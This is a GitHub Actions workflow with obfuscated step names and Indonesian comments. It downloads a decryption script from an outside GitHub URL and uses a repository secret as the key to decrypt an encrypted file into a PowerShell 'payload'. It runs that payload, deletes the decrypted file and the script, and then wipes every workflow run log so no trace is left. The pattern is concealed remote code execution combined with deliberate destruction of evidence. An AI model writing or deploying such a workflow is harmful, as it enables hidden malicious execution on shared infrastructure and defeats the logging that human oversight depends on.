name: weearefinallyfree

on:
  workflow_dispatch:

jobs:
  weearefinallyawake:
    runs-on: windows-latest
    permissions:
      actions: write
      contents: read

    steps:
      - name: r1dex
        uses: actions/checkout@v4
        
      - name: r2dex
        uses: actions/cache@v4
        with:
          path: |
            C:\Windows\r4dx
          key: ${{ runner.os }}-r4dx-session-${{ github.run_id }}
          restore-keys: |
            ${{ runner.os }}-r4dx-session-

      - name: r3dex
        shell: powershell
        env:
          API_KEY: ${{ secrets.API_KEY }}
          SSH_KEY: ${{ secrets.SSH_KEY }}
        run: |
          # 1. Download script
          curl.exe -sL "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py" -o main.py
  
          # 2. Jalankan Dekripsi
          # Kita gunakan nama file langsung tanpa Join-Path untuk mengurangi risiko error pathing
          if (Test-Path "database_i4x.dexenc") {
              Write-Host "[+] Mendekripsi database_i4x.dexenc..." -ForegroundColor Cyan
              
              # Jalankan Python
              python main.py decrypt -i "database_i4x.dexenc" -key "$env:API_KEY" -o "database_i4x.ps1"
              
              # 3. Tunggu 1 detik agar file benar-benar terdaftar di OS
              Start-Sleep -s 1
  
              if (Test-Path "database_i4x.ps1") {
                  Write-Host "[+] File ditemukan! Menjalankan payload..." -ForegroundColor Green
                  
                  # Gunakan path lengkap untuk eksekusi agar tidak dianggap perintah tidak dikenal
                  $payloadPath = Resolve-Path "database_i4x.ps1"
                  . $payloadPath
                  
                  # Cleanup
                  Remove-Item "database_i4x.ps1", "main.py" -Force
              } else {
                  # Cek isi folder untuk debugging jika masih gagal
                  Write-Host "[-] Gagal: database_i4x.ps1 tidak ditemukan di folder berikut:" -ForegroundColor Red
                  Get-ChildItem
                  exit 1
              }
          } else {
              Write-Host "[-] Gagal: database_i4x.dexenc tidak ditemukan!" -ForegroundColor Red
              Get-ChildItem
              exit 1
          }
          
      - name: i-am-r4dx
        uses: Mattraks/delete-workflow-runs@v2
        if: always()
        with:
          token: ${{ github.token }}
          repository: ${{ github.repository }}
          retain_days: 0
          keep_minimum_runs: 0
